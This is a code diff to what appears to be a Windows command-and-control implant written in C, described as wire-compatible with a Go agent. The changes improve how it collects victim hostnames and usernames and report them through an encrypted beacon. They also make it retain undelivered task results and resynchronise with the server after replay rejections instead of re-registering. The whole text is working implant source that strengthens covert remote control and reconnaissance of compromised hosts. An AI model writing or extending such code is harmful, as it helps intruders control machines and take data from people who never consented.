@@ -662,6 +662,27 @@ static const char *parse_task(const char *p, ctask_t *t) {
 
 /* ---------- host info + task handlers (wire-compatible with Go agent) ---------- */
 
+/* UTF-8 hostname/username via W APIs: GetComputerNameA returns ANSI (GBK on
+ * Chinese Windows) which corrupts JSON as mojibake. W + CP_UTF8 matches Go's
+ * os.Hostname (UTF-16 -> UTF-8) so CJK hostnames survive the wire. */
+static void get_hostname_utf8(char *out, DWORD cap) {
+    WCHAR w[256] = {0};
+    DWORD wlen = 256;
+    if (GetComputerNameW(w, &wlen) && w[0]) {
+        int n = WideCharToMultiByte(CP_UTF8, 0, w, -1, out, (int)cap, NULL, NULL);
+        if (n > 0) return;
+    }
+    strncpy(out, "unknown", cap - 1);
+}
+static void get_username_utf8(char *out, DWORD cap) {
+    WCHAR w[256] = {0};
+    DWORD wlen = 256;
+    if (GetUserNameW(w, &wlen) && w[0]) {
+        int n = WideCharToMultiByte(CP_UTF8, 0, w, -1, out, (int)cap, NULL, NULL);
+        if (n > 0) return;
+    }
+    strncpy(out, "unknown", cap - 1);
+}
 static char *b64_of_str(const char *s) {
     char *o;
     if (!s) s = "";
@@ -672,16 +693,13 @@ static char *b64_of_str(const char *s) {
 /* Build the inner \"info\" object JSON (malloc'd). Mirrors Go getSystemInfo:
  * hostname/username/ip are base64 with encoding=base64 marker. */
 static char *build_info_json(void) {
-    char host[256] = {0}, user[256] = {0};
-    DWORD hlen = sizeof(host), ulen = sizeof(user);
+    char host[512] = {0}, user[512] = {0};
     char *hb64 = NULL, *ub64 = NULL;
     char *out = NULL;
     char pname[MAX_PATH] = {0};
     DWORD pid = GetCurrentProcessId();
-    GetComputerNameA(host, &hlen);
-    GetUserNameA(user, &ulen);
-    if (!host[0]) strcpy_s(host, sizeof(host), "unknown");
-    if (!user[0]) strcpy_s(user, sizeof(user), "unknown");
+    get_hostname_utf8(host, sizeof(host));
+    get_username_utf8(user, sizeof(user));
     GetModuleFileNameA(NULL, pname, sizeof(pname));
     {
         char *base = strrchr(pname, '\\');
@@ -1080,8 +1098,7 @@ static int hostinfo_net(char *out, size_t cap) {
 }
 
 static char *do_hostinfo(const char *category) {
-    char host[256] = {0}, user[256] = {0};
-    DWORD hlen = sizeof(host), ulen = sizeof(user);
+    char host[512] = {0}, user[512] = {0};
     char *out = (char *)malloc(16384);
     OSVERSIONINFOEXA vi;
     MEMORYSTATUSEX ms;
@@ -1103,8 +1120,8 @@ static char *do_hostinfo(const char *category) {
         _snprintf(out, 16384, "{\"error\":\"unknown category \"\"%s\"\" (want: all|system|network|runtime)\"}", cat);
         return out;
     }
-    GetComputerNameA(host, &hlen);
-    GetUserNameA(user, &ulen);
+    get_hostname_utf8(host, sizeof(host));
+    get_username_utf8(user, sizeof(user));
     memset(&vi, 0, sizeof(vi));
     vi.dwOSVersionInfoSize = sizeof(vi);
     GetVersionExA((OSVERSIONINFOA *)&vi);
@@ -1113,14 +1130,17 @@ static char *do_hostinfo(const char *category) {
     used = (size_t)_snprintf(out, 16384,
         "{\"category\":\"%s\",\"platform\":\"windows\",\"sections\":{", cat);
     if (want_sys) {
+        char *hesc = jescape(host, sizeof(host));
+        char *uesc = jescape(user, sizeof(user));
         used += (size_t)_snprintf(out + used, 16384 - used,
             "\"system\":{\"hostname\":\"%s\",\"username\":\"%s\","
             "\"os\":\"Windows %lu.%lu build %lu\",\"arch\":\"amd64\",\"pid\":%lu,"
             "\"mem_total_mb\":%llu,\"mem_free_mb\":%llu}",
-            host, user,
+            hesc ? hesc : host, uesc ? uesc : user,
             (unsigned long)vi.dwMajorVersion, (unsigned long)vi.dwMinorVersion,
             (unsigned long)vi.dwBuildNumber, (unsigned long)GetCurrentProcessId(),
             ms.ullTotalPhys / (1024*1024), ms.ullAvailPhys / (1024*1024));
+        free(hesc); free(uesc);
     }
     if (want_net) {
         char nb[8192];
@@ -1423,8 +1443,6 @@ int main(void) {
             dbglog("results", results, (int)strlen(results));
             dbglog("inner", inner, (int)strlen(inner));
             free(info);
-            free(results);
-            results = _strdup("");
             frame = build_encrypted(inner, &frameseq);
             free(inner);
         }
@@ -1433,6 +1451,13 @@ int main(void) {
         free(frame);
         dbglog("post-ret", "", 0);
         if (!resp) { do_sleep_interval(); continue; }
+        /* Delivery confirmed (HTTP 200 with body): clear sent results.
+         * On encrypt/post failure above we keep `results` for the next
+         * loop (Go pendingResults parity) instead of dropping tasks to
+         * "running" forever (e.g. TASK 4 lost after a 400). */
+        free(results);
+        results = _strdup("");
+        if (!results) results = _strdup("");
         dbglog(g_registered ? "resp-enc" : "resp-reg", resp, (int)resplen);
 
         if (!g_registered) {
@@ -1772,9 +1797,19 @@ int main(void) {
                 if (blob) free(blob);
                 if (pt) free(pt);
             } else {
-                /* no ciphertext: resync envelope or session loss -> re-register */
-                g_have_session = 0;
-                g_registered = 0;
+                /* Plaintext resync (replay rejection): {seq,ecdh_pub,mac,last_seq}.
+                 * Verify MAC (regKey, uuid||seq||server_pub) like Go tryResync
+                 * and fast-forward g_seq to last_seq so the next beacon is
+                 * accepted instead of looping re-register/handshake. */
+                char rspub[512] = {0}, rmac[512] = {0};
+                unsigned long long rseq = ju64(resp, "seq");
+                unsigned long long rlast = ju64(resp, "last_seq");
+                if (rseq && rlast && jstring(resp, "ecdh_pub", rspub, sizeof(rspub)) && jstring(resp, "mac", rmac, sizeof(rmac)) && verify_resp_mac(rseq, rspub, rmac)) {
+                    if (rlast > g_seq) { g_seq = rlast; seq_save(); }
+                } else {
+                    g_have_session = 0;
+                    g_registered = 0;
+                }
             }
             free(c64);
         }
